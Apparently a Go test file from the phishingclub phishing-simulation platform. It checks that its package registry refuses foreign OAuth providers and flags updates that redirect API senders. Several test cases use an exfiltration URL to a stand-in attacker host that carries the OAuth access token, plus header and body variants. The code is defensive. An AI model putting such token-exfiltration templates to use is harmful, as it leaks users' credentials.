package service

import (
	"errors"
	"strings"
	"testing"

	"github.com/google/uuid"
	"github.com/phishingclub/phishingclub/database"
	"github.com/phishingclub/phishingclub/model"
	"github.com/phishingclub/phishingclub/registry"
	"github.com/phishingclub/phishingclub/repository"
)

// graphSenderYAML is an api sender that names the oauth provider ref.
func graphSenderYAML(ref string) string {
	return `
apiSenders:
  - name: Graph Sender
    requestMethod: POST
    requestURL: https://graph.example.test/send
    requestBody: "{}"
    expectedResponseStatusCode: 202
    oauthProvider: "` + ref + `"
`
}

func oauthProviderYAML(names ...string) string {
	out := "\noauthProviders:\n"
	for _, n := range names {
		out += "  - name: " + n + `
    authURL: https://login.example.test/authorize
    tokenURL: https://login.example.test/token
    scopes: mail.send
    clientID: client
    clientSecret: secret
`
	}
	return out
}

// operatorProvider creates an oauth provider the way an operator does, with no
// provenance row.
func (h *regFixture) operatorProvider(name string) *uuid.UUID {
	h.t.Helper()
	m, err := buildOAuthProviderModel(name, "https://evil.example.test/a", "https://evil.example.test/t", "x", "c", "s")
	if err != nil {
		h.t.Fatalf("provider model: %v", err)
	}
	id, err := h.s.OAuthProvider.Create(h.ctx, h.session, m)
	if err != nil {
		h.t.Fatalf("operator provider: %v", err)
	}
	return id
}

func (h *regFixture) resolveOAuthProviderID(name string) (*uuid.UUID, error) {
	p, err := h.s.OAuthProviderRepository.GetByNameAndCompanyID(h.ctx, name, nil)
	if err != nil {
		return nil, err
	}
	id := p.ID.MustGet()
	return &id, nil
}

// fetchVersions answers a fetch like fetchFrom, and also by "id@version".
func fetchVersions(pkgs ...*registry.VerifiedPackage) func(string) (*registry.VerifiedPackage, error) {
	byID := map[string]*registry.VerifiedPackage{}
	for _, p := range pkgs {
		byID[p.Manifest.ID] = p
		byID[p.Manifest.ID+"@"+p.Manifest.Version] = p
	}
	return func(id string) (*registry.VerifiedPackage, error) {
		if p, ok := byID[id]; ok {
			return p, nil
		}
		return nil, errors.New("not found")
	}
}

func (h *regFixture) sender(name string) *model.APISender {
	h.t.Helper()
	id, err := h.s.resolveAPISenderID(h.ctx, name)
	if err != nil {
		h.t.Fatalf("api sender %s: %v", name, err)
	}
	a, err := h.s.APISenderRepository.GetByID(h.ctx, id, &repository.APISenderOption{})
	if err != nil {
		h.t.Fatalf("load api sender: %v", err)
	}
	return a
}

// senderProvider returns the oauth provider id the named api sender is bound to.
func (h *regFixture) senderProvider(name string) *uuid.UUID {
	h.t.Helper()
	a := h.sender(name)
	if !a.OAuthProviderID.IsSpecified() || a.OAuthProviderID.IsNull() {
		return nil
	}
	v := a.OAuthProviderID.MustGet()
	return &v
}

func (h *regFixture) senderCount() int64 {
	var n int64
	h.db.Model(&database.APISender{}).Count(&n)
	return n
}

func isForeignOAuthErr(err error) bool {
	return err != nil && strings.Contains(err.Error(), "was not installed from this namespace on this Bait Box")
}

// TestOAuthPlainNameRefusesOperatorProvider installs an api sender that names an
// oauth provider the operator created. The plan refuses it, and so does the write
// step when the provider appears after the plan ran. Nothing is left behind.
func TestOAuthPlainNameRefusesOperatorProvider(t *testing.T) {
	h := newForeignKeyRegFixture(t)
	regID := uuid.New()
	pkg := typedPackage("ns/send", "apisender", "1.0.0", graphSenderYAML("Graph"), nil)

	plan, err := h.s.planInstall(h.ctx, &regID, "ns", "send", nil, nil, fetchFrom(pkg))
	if err != nil {
		t.Fatalf("plan before the provider exists: %v", err)
	}
	h.operatorProvider("Graph")

	if _, err := h.s.planInstall(h.ctx, &regID, "ns", "send", nil, nil, fetchFrom(pkg)); !isForeignOAuthErr(err) {
		t.Fatalf("plan: want the foreign provider refusal, got %v", err)
	}
	ae := NewAuditEvent("Registry.Install", h.session)
	if _, err := h.s.applyInstall(h.ctx, h.session, ae, &regID, plan, nil); !isForeignOAuthErr(err) {
		t.Fatalf("apply: want the foreign provider refusal, got %v", err)
	}
	if n := h.senderCount(); n != 0 {
		t.Fatalf("%d api senders left after a refused install", n)
	}
	if h.isInstalled(&regID, "ns/send") {
		t.Fatal("refused install left an installed package row")
	}
}

// TestOAuthBindsProviderFromSameSource binds an api sender to a provider from the
// same package, from a bundle sibling and from another package of the same
// namespace on the same Bait Box. A provider from another namespace or another
// Bait Box is refused, and so is a bundle sibling from another namespace.
func TestOAuthBindsProviderFromSameSource(t *testing.T) {
	h := newForeignKeyRegFixture(t)
	regID := uuid.New()

	h.install(&regID, "ns/graph", nil, fetchFrom(oauthSenderPackage()))
	graphID, err := h.resolveOAuthProviderID("Graph")
	if err != nil {
		t.Fatalf("provider: %v", err)
	}
	if got := h.senderProvider("Graph Sender"); got == nil || *got != *graphID {
		t.Fatal("same package sender not bound to its provider")
	}

	prov := typedPackage("ns/prov", "oauthprovider", "1.0.0", oauthProviderYAML("Mail"), nil)
	send := typedPackage("ns/mailsend", "apisender", "1.0.0",
		strings.ReplaceAll(graphSenderYAML("Mail"), "Graph Sender", "Mail Sender"), nil)
	kit := typedPackage("ns/kit", "bundle", "1.0.0", "", nil, "ns/mailsend", "ns/prov")
	h.install(&regID, "ns/kit", nil, fetchFrom(kit, prov, send))
	mailID, err := h.resolveOAuthProviderID("Mail")
	if err != nil {
		t.Fatalf("bundle provider: %v", err)
	}
	if got := h.senderProvider("Mail Sender"); got == nil || *got != *mailID {
		t.Fatal("bundle sender not bound to the sibling provider")
	}

	same := typedPackage("ns/later", "apisender", "1.0.0",
		strings.ReplaceAll(graphSenderYAML("Mail"), "Graph Sender", "Later Sender"), nil)
	h.install(&regID, "ns/later", nil, fetchFrom(same))
	if got := h.senderProvider("Later Sender"); got == nil || *got != *mailID {
		t.Fatal("sender not bound to a provider from the same Bait Box")
	}

	otherNS := typedPackage("other/later", "apisender", "1.0.0",
		strings.ReplaceAll(graphSenderYAML("Mail"), "Graph Sender", "Other NS Sender"), nil)
	_, err = h.s.planInstall(h.ctx, &regID, "other", "later", nil, nil, fetchFrom(otherNS))
	if !isForeignOAuthErr(err) {
		t.Fatalf("provider from another namespace: want refusal, got %v", err)
	}

	otherReg := uuid.New()
	foreign := typedPackage("ns/later", "apisender", "1.0.0",
		strings.ReplaceAll(graphSenderYAML("Mail"), "Graph Sender", "Other Sender"), nil)
	_, err = h.s.planInstall(h.ctx, &otherReg, "ns", "later", nil, nil, fetchFrom(foreign))
	if !isForeignOAuthErr(err) {
		t.Fatalf("provider from another Bait Box: want refusal, got %v", err)
	}

	// members of one namespace bind each other inside a bundle of another.
	carolProv := typedPackage("carol/prov", "oauthprovider", "1.0.0", oauthProviderYAML("Carol"), nil)
	carolSend := typedPackage("carol/send", "apisender", "1.0.0",
		strings.ReplaceAll(graphSenderYAML("Carol"), "Graph Sender", "Carol Sender"), nil)
	carolKit := typedPackage("ns/carolkit", "bundle", "1.0.0", "", nil, "carol/send", "carol/prov")
	h.install(&regID, "ns/carolkit", nil, fetchFrom(carolKit, carolProv, carolSend))
	carolID, err := h.resolveOAuthProviderID("Carol")
	if err != nil {
		t.Fatalf("carol provider: %v", err)
	}
	if got := h.senderProvider("Carol Sender"); got == nil || *got != *carolID {
		t.Fatal("sender not bound to a sibling of its own namespace")
	}

	aliceProv := typedPackage("alice/prov", "oauthprovider", "1.0.0", oauthProviderYAML("Alice"), nil)
	bobSend := typedPackage("bob/send", "apisender", "1.0.0",
		strings.ReplaceAll(graphSenderYAML("Alice"), "Graph Sender", "Bob Sender"), nil)
	mixed := typedPackage("ns/mixed", "bundle", "1.0.0", "", nil, "bob/send", "alice/prov")
	_, err = h.s.planInstall(h.ctx, &regID, "ns", "mixed", nil, nil, fetchFrom(mixed, aliceProv, bobSend))
	if !isForeignOAuthErr(err) {
		t.Fatalf("sibling from another namespace: want refusal, got %v", err)
	}
}

// TestOAuthOtherNamespaceRefusesAuthorizedProvider installs and authorizes
// alice/prov, then installs mallory/send from the same Bait Box naming that
// provider. The plan refuses it, and so does the write step when the provider
// appears after the plan ran. Nothing is left behind.
func TestOAuthOtherNamespaceRefusesAuthorizedProvider(t *testing.T) {
	h := newForeignKeyRegFixture(t)
	regID := uuid.New()
	send := typedPackage("mallory/send", "apisender", "1.0.0", graphSenderYAML("Alice"), nil)
	plan, err := h.s.planInstall(h.ctx, &regID, "mallory", "send", nil, nil, fetchFrom(send))
	if err != nil {
		t.Fatalf("plan before the provider exists: %v", err)
	}

	prov := typedPackage("alice/prov", "oauthprovider", "1.0.0", oauthProviderYAML("Alice"), nil)
	h.install(&regID, "alice/prov", nil, fetchFrom(prov))
	aliceID, err := h.resolveOAuthProviderID("Alice")
	if err != nil {
		t.Fatalf("provider: %v", err)
	}
	h.authorize(aliceID)

	if _, err := h.s.planInstall(h.ctx, &regID, "mallory", "send", nil, nil, fetchFrom(send)); !isForeignOAuthErr(err) {
		t.Fatalf("plan: want the foreign provider refusal, got %v", err)
	}
	ae := NewAuditEvent("Registry.Install", h.session)
	if _, err := h.s.applyInstall(h.ctx, h.session, ae, &regID, plan, nil); !isForeignOAuthErr(err) {
		t.Fatalf("apply: want the foreign provider refusal, got %v", err)
	}
	if n := h.senderCount(); n != 0 {
		t.Fatalf("%d api senders left after a refused install", n)
	}
	if h.isInstalled(&regID, "mallory/send") {
		t.Fatal("refused install left an installed package row")
	}
}

// TestOAuthPickBindsOperatorProvider binds an operator provider chosen through a
// pick variable. The same reference filled only from an author default is refused.
func TestOAuthPickBindsOperatorProvider(t *testing.T) {
	h := newForeignKeyRegFixture(t)
	regID := uuid.New()
	mineID := h.operatorProvider("Mine")

	pkg := typedPackage("ns/pick", "apisender", "1.0.0", graphSenderYAML("@@PROVIDER@@"), nil)
	pkg.Manifest.Variables = []registry.Variable{{
		Name: "PROVIDER", Type: "string", Required: true, Pick: pickOAuthProvider,
	}}
	h.install(&regID, "ns/pick", map[string]string{"PROVIDER": "Mine"}, fetchFrom(pkg))
	if got := h.senderProvider("Graph Sender"); got == nil || *got != *mineID {
		t.Fatal("picked provider not bound")
	}

	def := "Mine"
	byDefault := typedPackage("ns/default", "apisender", "1.0.0",
		strings.ReplaceAll(graphSenderYAML("@@PROVIDER@@"), "Graph Sender", "Default Sender"), nil)
	byDefault.Manifest.Variables = []registry.Variable{{
		Name: "PROVIDER", Type: "string", Pick: pickOAuthProvider, Default: &def,
	}}
	_, err := h.s.planInstall(h.ctx, &regID, "ns", "default", nil, nil, fetchFrom(byDefault))
	if !isForeignOAuthErr(err) {
		t.Fatalf("pick filled by default: want refusal, got %v", err)
	}

	plain := typedPackage("ns/plainvar", "apisender", "1.0.0",
		strings.ReplaceAll(graphSenderYAML("@@PROVIDER@@"), "Graph Sender", "Plain Sender"), nil)
	plain.Manifest.Variables = []registry.Variable{{Name: "PROVIDER", Type: "string", Required: true}}
	_, err = h.s.planInstall(h.ctx, &regID, "ns", "plainvar", map[string]string{"PROVIDER": "Mine"}, nil, fetchFrom(plain))
	if !isForeignOAuthErr(err) {
		t.Fatalf("plain text variable: want refusal, got %v", err)
	}
}

// TestOAuthUpdateRebindIsConflict updates a sender so it names another provider.
// The update stops with a conflict that says why; keep leaves the binding, and
// overwrite rebinds to the package's own provider. A rebind to an operator
// provider is refused even when overwrite is chosen. An update that leaves the
// binding and the request alone applies with no conflict.
func TestOAuthUpdateRebindIsConflict(t *testing.T) {
	h := newForeignKeyRegFixture(t)
	regID := uuid.New()
	ip := h.install(&regID, "ns/graph", nil, fetchFrom(oauthSenderPackage()))
	graphID, err := h.resolveOAuthProviderID("Graph")
	if err != nil {
		t.Fatalf("provider: %v", err)
	}
	update := func(pkg *registry.VerifiedPackage, resolutions map[string]string) error {
		ae := NewAuditEvent("Registry.PackageUpdate", h.session)
		_, err := h.s.applyUpdate(h.ctx, h.session, ae, ip, pkg, fetchFrom(pkg), nil, resolutions, nil)
		if err == nil {
			ip = h.installed(&regID, "ns/graph")
		}
		return err
	}

	same := typedPackage("ns/graph", "apisender", "1.1.0",
		oauthProviderYAML("Graph")+strings.ReplaceAll(graphSenderYAML("Graph"), "202", "200"), nil)
	if err := update(same, nil); err != nil {
		t.Fatalf("update with the same binding and request: %v", err)
	}

	v2 := typedPackage("ns/graph", "apisender", "2.0.0",
		oauthProviderYAML("Graph", "Graph Two")+graphSenderYAML("Graph Two"), nil)
	err = update(v2, nil)
	var ce ErrUpdateConflicts
	if !errors.As(err, &ce) {
		t.Fatalf("want an update conflict, got %v", err)
	}
	if len(ce.Conflicts) != 1 || ce.Conflicts[0].ResourceType != "apisender" ||
		!strings.Contains(ce.Conflicts[0].Reason, `"Graph Two"`) {
		t.Fatalf("conflicts = %+v", ce.Conflicts)
	}
	if got := h.senderProvider("Graph Sender"); got == nil || *got != *graphID {
		t.Fatal("conflicted update changed the binding")
	}

	if err := update(v2, map[string]string{"apisender:Graph Sender": resolveKeep}); err != nil {
		t.Fatalf("keep: %v", err)
	}
	if got := h.senderProvider("Graph Sender"); got == nil || *got != *graphID {
		t.Fatal("keep changed the binding")
	}

	v3 := typedPackage("ns/graph", "apisender", "3.0.0",
		oauthProviderYAML("Graph", "Graph Two")+strings.ReplaceAll(graphSenderYAML("Graph Two"), "/send", "/send3"), nil)
	if err := update(v3, map[string]string{"apisender:Graph Sender": resolveOverwrite}); err != nil {
		t.Fatalf("overwrite: %v", err)
	}
	twoID, err := h.resolveOAuthProviderID("Graph Two")
	if err != nil {
		t.Fatalf("second provider: %v", err)
	}
	if got := h.senderProvider("Graph Sender"); got == nil || *got != *twoID {
		t.Fatal("overwrite did not rebind to the package's provider")
	}

	h.operatorProvider("Operator")
	v4 := typedPackage("ns/graph", "apisender", "4.0.0",
		oauthProviderYAML("Graph", "Graph Two")+graphSenderYAML("Operator"), nil)
	err = update(v4, nil)
	if !errors.As(err, &ce) || len(ce.Conflicts) != 1 || !ce.Conflicts[0].KeepOnly ||
		!strings.Contains(ce.Conflicts[0].Reason, "was not installed from this namespace on this Bait Box") {
		t.Fatalf("rebind to an operator provider: want a conflict, got %v", err)
	}
	err = update(v4, map[string]string{"apisender:Graph Sender": resolveOverwrite})
	if !isForeignOAuthErr(err) {
		t.Fatalf("overwrite onto an operator provider: want refusal, got %v", err)
	}
	if got := h.senderProvider("Graph Sender"); got == nil || *got != *twoID {
		t.Fatal("refused update changed the binding")
	}
}

// TestOAuthPickIgnoresMemberVariable installs a bundle whose sender names its
// provider through a pick, next to a member that declares a plain variable of the
// same name with another provider as its default. The sender binds to the
// operator's pick on install, on update and on an update that adds such a member.
func TestOAuthPickIgnoresMemberVariable(t *testing.T) {
	h := newForeignKeyRegFixture(t)
	regID := uuid.New()
	h.operatorProvider("Prod")
	harmlessID := h.operatorProvider("Harmless")

	prod := "Prod"
	member := func(id, provider string) *registry.VerifiedPackage {
		p := typedPackage(id, "oauthprovider", "1.0.0", oauthProviderYAML(provider), nil)
		p.Manifest.Variables = []registry.Variable{{Name: "PROV", Type: "string", Default: &prod}}
		return p
	}
	off := false
	kit := func(version, status string, deps ...string) *registry.VerifiedPackage {
		p := typedPackage("ns/kit", "bundle", version,
			strings.ReplaceAll(graphSenderYAML("@@PROV@@"), "202", status), nil, deps...)
		p.Manifest.ShareVariables = &off
		p.Manifest.Variables = []registry.Variable{{
			Name: "PROV", Type: "string", Required: true, Pick: pickOAuthProvider,
		}}
		return p
	}
	mem, mem2 := member("ns/mem", "Mem One"), member("ns/mem2", "Mem Two")
	vars := map[string]string{varKey("ns/kit", "PROV", false): "Harmless"}

	v1 := kit("1.0.0", "202", "ns/mem")
	ip := h.install(&regID, "ns/kit", vars, fetchFrom(v1, mem))
	if got := h.senderProvider("Graph Sender"); got == nil || *got != *harmlessID {
		t.Fatal("install bound the sender to a provider the operator did not pick")
	}

	update := func(pkg *registry.VerifiedPackage) {
		t.Helper()
		ae := NewAuditEvent("Registry.PackageUpdate", h.session)
		fetch := fetchFrom(pkg, mem, mem2)
		if _, err := h.s.applyUpdate(h.ctx, h.session, ae, ip, pkg, fetch, nil, nil, nil); err != nil {
			t.Fatalf("update %s: %v", pkg.Manifest.Version, err)
		}
		ip = h.installed(&regID, "ns/kit")
		if got := h.senderProvider("Graph Sender"); got == nil || *got != *harmlessID {
			t.Fatalf("update %s bound the sender to a provider the operator did not pick", pkg.Manifest.Version)
		}
	}
	update(kit("1.1.0", "200", "ns/mem"))
	update(kit("1.2.0", "201", "ns/mem", "ns/mem2"))
}

// authorize gives the provider tokens as an authorization would.
func (h *regFixture) authorize(id *uuid.UUID) {
	h.t.Helper()
	err := h.db.Model(&database.OAuthProvider{ID: *id}).
		Updates(map[string]any{"is_authorized": true, "access_token": "token"}).Error
	if err != nil {
		h.t.Fatalf("authorize: %v", err)
	}
}

func (h *regFixture) providerURLs(id *uuid.UUID) (string, string) {
	h.t.Helper()
	p, err := h.s.OAuthProviderRepository.GetByID(h.ctx, *id)
	if err != nil {
		h.t.Fatalf("load provider: %v", err)
	}
	return optStr(p.AuthURL), optStr(p.TokenURL)
}

// TestOAuthAuthorizedURLChangeIsConflict changes a provider URL while it is not
// authorized, which applies with no conflict, then once it is authorized, which
// waits for a choice. Keep leaves the URL and overwrite applies it.
func TestOAuthAuthorizedURLChangeIsConflict(t *testing.T) {
	h := newForeignKeyRegFixture(t)
	regID := uuid.New()
	ip := h.install(&regID, "ns/graph", nil, fetchFrom(oauthSenderPackage()))
	graphID, err := h.resolveOAuthProviderID("Graph")
	if err != nil {
		t.Fatalf("provider: %v", err)
	}
	version := func(v, auth, token string) *registry.VerifiedPackage {
		y := oauthProviderYAML("Graph")
		y = strings.ReplaceAll(y, "https://login.example.test/authorize", auth)
		y = strings.ReplaceAll(y, "https://login.example.test/token", token)
		return typedPackage("ns/graph", "apisender", v, y+graphSenderYAML("Graph"), nil)
	}
	update := func(pkg *registry.VerifiedPackage, resolutions map[string]string) (*InstallResult, error) {
		ae := NewAuditEvent("Registry.PackageUpdate", h.session)
		res, err := h.s.applyUpdate(h.ctx, h.session, ae, ip, pkg, fetchFrom(pkg), nil, resolutions, nil)
		if err == nil {
			ip = h.installed(&regID, "ns/graph")
		}
		return res, err
	}

	if _, err := update(version("1.1.0", "https://a2.example.test/authorize", "https://login.example.test/token"), nil); err != nil {
		t.Fatalf("unauthorized URL change: %v", err)
	}
	h.authorize(graphID)

	v2 := version("2.0.0", "https://a2.example.test/authorize", "https://t2.example.test/token")
	_, err = update(v2, nil)
	var ce ErrUpdateConflicts
	if !errors.As(err, &ce) {
		t.Fatalf("want an update conflict, got %v", err)
	}
	if len(ce.Conflicts) != 1 || ce.Conflicts[0].ResourceType != "oauthprovider" ||
		!strings.Contains(ce.Conflicts[0].Reason, "token URL") ||
		strings.Contains(ce.Conflicts[0].Reason, "authorization URL") {
		t.Fatalf("conflicts = %+v", ce.Conflicts)
	}

	res, err := update(v2, map[string]string{"oauthprovider:Graph": resolveKeep})
	if err != nil {
		t.Fatalf("keep: %v", err)
	}
	if _, tok := h.providerURLs(graphID); tok != "https://login.example.test/token" {
		t.Fatalf("keep changed the token URL to %s", tok)
	}
	kept := false
	for _, s := range res.Skipped {
		if strings.Contains(s, keptCurrentURLs) {
			kept = true
		}
		if strings.Contains(s, keptLocalEdit) {
			t.Fatalf("keep reported as a local edit: %q", s)
		}
	}
	if !kept {
		t.Fatalf("skipped = %v, want the kept URLs note", res.Skipped)
	}

	v3 := version("3.0.0", "https://a2.example.test/authorize", "https://t3.example.test/token")
	if _, err := update(v3, map[string]string{"oauthprovider:Graph": resolveOverwrite}); err != nil {
		t.Fatalf("overwrite: %v", err)
	}
	if _, tok := h.providerURLs(graphID); tok != "https://t3.example.test/token" {
		t.Fatalf("overwrite left the token URL at %s", tok)
	}
}

// TestOAuthRenamedOwnProviderKeepsBinding renames the package's own provider
// locally, then updates the sender. The sender stays on that provider with no
// conflict.
func TestOAuthRenamedOwnProviderKeepsBinding(t *testing.T) {
	h := newForeignKeyRegFixture(t)
	regID := uuid.New()
	ip := h.install(&regID, "ns/graph", nil, fetchFrom(oauthSenderPackage()))
	graphID, err := h.resolveOAuthProviderID("Graph")
	if err != nil {
		t.Fatalf("provider: %v", err)
	}
	if err := h.db.Model(&database.OAuthProvider{ID: *graphID}).Update("name", "Graph Local").Error; err != nil {
		t.Fatalf("rename: %v", err)
	}
	v2 := typedPackage("ns/graph", "apisender", "1.1.0",
		oauthProviderYAML("Graph")+strings.ReplaceAll(graphSenderYAML("Graph"), "202", "200"), nil)
	ae := NewAuditEvent("Registry.PackageUpdate", h.session)
	if _, err := h.s.applyUpdate(h.ctx, h.session, ae, ip, v2, fetchFrom(v2), nil, nil, nil); err != nil {
		t.Fatalf("update: %v", err)
	}
	if got := h.senderProvider("Graph Sender"); got == nil || *got != *graphID {
		t.Fatal("sender left its renamed provider")
	}
}

// senderYAML is an api sender with the given request, naming the oauth provider ref.
func senderYAML(name, url, header, body, ref string) string {
	y := `
  - name: ` + name + `
    requestMethod: POST
    requestURL: "` + url + `"
    requestBody: '` + body + `'
    expectedResponseStatusCode: 202
    oauthProvider: "` + ref + `"
`
	if header != "" {
		y += "    requestHeaders:\n      - key: X-Test\n        value: \"" + header + "\"\n"
	}
	return y
}

const exfilURL = "https://attacker.test/x?t={{.OAuthAccessToken}}"

// keepAll keeps every conflict.
func keepAll(conflicts []UpdateConflict) map[string]string {
	out := map[string]string{}
	for _, c := range conflicts {
		out[c.Key()] = resolveKeep
	}
	return out
}

func skippedHas(res *InstallResult, note string) bool {
	for _, s := range res.Skipped {
		if strings.Contains(s, note) {
			return true
		}
	}
	return false
}

// TestOAuthUpdateRequestChangeIsConflict changes the request of an api sender
// bound to an oauth provider. A change in whitespace alone applies. A new URL,
// header or body waits for a choice that says why; keep leaves the sender as it
// is, and overwrite applies the change.
func TestOAuthUpdateRequestChangeIsConflict(t *testing.T) {
	h := newForeignKeyRegFixture(t)
	regID := uuid.New()
	const url = "https://graph.example.test/send"
	version := func(v, url, header, body string) *registry.VerifiedPackage {
		return typedPackage("ns/graph", "apisender", v,
			oauthProviderYAML("Graph")+"\napiSenders:"+senderYAML("Graph Sender", url, header, body, "Graph"), nil)
	}
	v1 := version("1.0.0", url, "a", "{}")
	ip := h.install(&regID, "ns/graph", nil, fetchFrom(v1))
	update := func(pkg *registry.VerifiedPackage, resolutions map[string]string) (*InstallResult, error) {
		ae := NewAuditEvent("Registry.PackageUpdate", h.session)
		res, err := h.s.applyUpdate(h.ctx, h.session, ae, ip, pkg, fetchVersions(pkg, v1), nil, resolutions, nil)
		if err == nil {
			ip = h.installed(&regID, "ns/graph")
		}
		return res, err
	}

	if _, err := update(version("1.1.0", "  "+url+"  ", " a ", " {} "), nil); err != nil {
		t.Fatalf("whitespace only change: %v", err)
	}

	cases := []struct {
		name string
		pkg  *registry.VerifiedPackage
	}{
		{"url", version("2.0.0", exfilURL, "a", "{}")},
		{"header", version("2.0.0", url, "{{.OAuthAccessToken}}", "{}")},
		{"body", version("2.0.0", url, "a", `{"t":"{{.OAuthAccessToken}}"}`)},
	}
	for _, c := range cases {
		_, err := update(c.pkg, nil)
		var ce ErrUpdateConflicts
		if !errors.As(err, &ce) {
			t.Fatalf("%s: want an update conflict, got %v", c.name, err)
		}
		if len(ce.Conflicts) != 1 || ce.Conflicts[0].ResourceType != "apisender" ||
			!strings.Contains(ce.Conflicts[0].Reason, `changes where the API sender "Graph Sender" sends requests`) {
			t.Fatalf("%s: conflicts = %+v", c.name, ce.Conflicts)
		}
		res, err := update(c.pkg, keepAll(ce.Conflicts))
		if err != nil {
			t.Fatalf("%s: keep: %v", c.name, err)
		}
		if !skippedHas(res, keptCurrentRequest) || skippedHas(res, keptLocalEdit) {
			t.Fatalf("%s: skipped = %v, want the kept request note", c.name, res.Skipped)
		}
		a := h.sender("Graph Sender")
		if optStr(a.RequestURL) != url || optStr(a.RequestBody) != "{}" ||
			!strings.Contains(optHeaders(a.RequestHeaders), "X-Test: a") {
			t.Fatalf("%s: keep changed the request", c.name)
		}
	}

	if _, err := update(version("3.0.0", exfilURL, "a", "{}"), map[string]string{"apisender:Graph Sender": resolveOverwrite}); err != nil {
		t.Fatalf("overwrite: %v", err)
	}
	if got := optStr(h.sender("Graph Sender").RequestURL); got != exfilURL {
		t.Fatalf("overwrite left the URL at %s", got)
	}
}

// pickSenderPackage is a package whose api senders name the operator's pick.
func pickSenderPackage(version, senders string) *registry.VerifiedPackage {
	p := typedPackage("ns/pick", "apisender", version, "\napiSenders:"+senders, nil)
	p.Manifest.Variables = []registry.Variable{{
		Name: "PROVIDER", Type: "string", Required: true, Pick: pickOAuthProvider,
	}}
	return p
}

// TestOAuthUpdatePickedSenderRedirectIsConflict installs a sender bound to the
// operator's picked provider, then updates it to send its requests, with the
// token, to another host. The update waits for a choice, and keeping every
// conflict leaves the sender as it is.
func TestOAuthUpdatePickedSenderRedirectIsConflict(t *testing.T) {
	h := newForeignKeyRegFixture(t)
	regID := uuid.New()
	mineID := h.operatorProvider("Mine")
	const url = "https://graph.example.test/send"
	v1 := pickSenderPackage("1.0.0", senderYAML("Graph Sender", url, "", "{}", "@@PROVIDER@@"))
	ip := h.install(&regID, "ns/pick", map[string]string{"PROVIDER": "Mine"}, fetchFrom(v1))

	v2 := pickSenderPackage("2.0.0", senderYAML("Graph Sender", exfilURL, "", "{}", "@@PROVIDER@@"))
	ae := NewAuditEvent("Registry.PackageUpdate", h.session)
	_, err := h.s.applyUpdate(h.ctx, h.session, ae, ip, v2, fetchVersions(v2, v1), nil, nil, nil)
	var ce ErrUpdateConflicts
	if !errors.As(err, &ce) || len(ce.Conflicts) != 1 || ce.Conflicts[0].Reason == "" {
		t.Fatalf("want a conflict with a reason, got %v", err)
	}
	ae = NewAuditEvent("Registry.PackageUpdate", h.session)
	if _, err := h.s.applyUpdate(h.ctx, h.session, ae, ip, v2, fetchVersions(v2, v1), nil, keepAll(ce.Conflicts), nil); err != nil {
		t.Fatalf("keep: %v", err)
	}
	a := h.sender("Graph Sender")
	if optStr(a.RequestURL) != url {
		t.Fatalf("keep sent the token to %s", optStr(a.RequestURL))
	}
	if got := h.senderProvider("Graph Sender"); got == nil || *got != *mineID {
		t.Fatal("keep changed the binding")
	}
}

// TestOAuthUpdateNewPickedSenderAsksAgain updates a package so it adds a second
// api sender that names the operator's pick and sends to another host. The
// stored pick does not bind it: the update asks for the pick again, also when
// every conflict is kept, and creates nothing until the operator chooses. An
// update that only changes the existing sender keeps using the stored pick the
// install recorded, without reading the installed version.
func TestOAuthUpdateNewPickedSenderAsksAgain(t *testing.T) {
	h := newForeignKeyRegFixture(t)
	regID := uuid.New()
	mineID := h.operatorProvider("Mine")
	const url = "https://graph.example.test/send"
	graph := senderYAML("Graph Sender", url, "", "{}", "@@PROVIDER@@")
	v1 := pickSenderPackage("1.0.0", graph)
	ip := h.install(&regID, "ns/pick", map[string]string{"PROVIDER": "Mine"}, fetchFrom(v1))
	update := func(
		pkg *registry.VerifiedPackage, fetch func(string) (*registry.VerifiedPackage, error),
		vars, resolutions map[string]string,
	) error {
		ae := NewAuditEvent("Registry.PackageUpdate", h.session)
		_, err := h.s.applyUpdate(h.ctx, h.session, ae, ip, pkg, fetch, vars, resolutions, nil)
		if err == nil {
			ip = h.installed(&regID, "ns/pick")
		}
		return err
	}
	isPickMissing := func(err error) bool {
		var me ErrMissingVariables
		return errors.As(err, &me) && len(me.Variables) == 1 &&
			me.Variables[0].Name == "PROVIDER" && me.Variables[0].Pick == pickOAuthProvider
	}

	v2 := pickSenderPackage("2.0.0", graph+senderYAML("Exfil Sender", exfilURL, "", "{}", "@@PROVIDER@@"))
	if err := update(v2, fetchVersions(v2, v1), nil, nil); !isPickMissing(err) {
		t.Fatalf("new sender on a stored pick: want the pick asked again, got %v", err)
	}
	keep := map[string]string{"apisender:Graph Sender": resolveKeep, "apisender:Exfil Sender": resolveKeep}
	if err := update(v2, fetchVersions(v2, v1), nil, keep); !isPickMissing(err) {
		t.Fatalf("keep all: want the pick asked again, got %v", err)
	}
	if n := h.senderCount(); n != 1 {
		t.Fatalf("%d api senders after the update was stopped", n)
	}

	status := pickSenderPackage("1.1.0", strings.ReplaceAll(graph, "202", "200"))
	if err := update(status, fetchFrom(status), nil, nil); err != nil {
		t.Fatalf("update on the stored pick: %v", err)
	}
	if got := h.senderProvider("Graph Sender"); got == nil || *got != *mineID {
		t.Fatal("update on the stored pick changed the binding")
	}

	v2 = pickSenderPackage("2.0.0", strings.ReplaceAll(graph, "202", "200")+
		senderYAML("Exfil Sender", exfilURL, "", "{}", "@@PROVIDER@@"))
	if err := update(v2, fetchVersions(v2, status), map[string]string{"PROVIDER": "Mine"}, nil); err != nil {
		t.Fatalf("update with the pick chosen again: %v", err)
	}
	if got := h.senderProvider("Exfil Sender"); got == nil || *got != *mineID {
		t.Fatal("new sender not bound to the pick chosen in this update")
	}
}

// TestOAuthUpdatePlainVariableBecomesPick installs a package with a plain text
// variable whose value names an operator provider, then updates it so the same
// variable is an OAuth provider pick the sender names. The Bait Box serves the
// installed version with a manifest that also calls the variable a pick. The
// install recorded the value as plain text, not a choice of provider, so the
// update asks for the pick before it offers the rebind, and Overwrite alone binds
// nothing.
func TestOAuthUpdatePlainVariableBecomesPick(t *testing.T) {
	h := newForeignKeyRegFixture(t)
	regID := uuid.New()
	contosoID := h.operatorProvider("Contoso")
	v1 := typedPackage("ns/graph", "apisender", "1.0.0",
		oauthProviderYAML("Graph")+graphSenderYAML("Graph"), nil)
	v1.Manifest.Variables = []registry.Variable{{Name: "TENANT", Type: "string", Required: true}}
	ip := h.install(&regID, "ns/graph", map[string]string{"TENANT": "Contoso"}, fetchFrom(v1))
	graphID, err := h.resolveOAuthProviderID("Graph")
	if err != nil {
		t.Fatalf("provider: %v", err)
	}

	v2 := typedPackage("ns/graph", "apisender", "2.0.0",
		oauthProviderYAML("Graph")+graphSenderYAML("@@TENANT@@"), nil)
	v2.Manifest.Variables = []registry.Variable{{
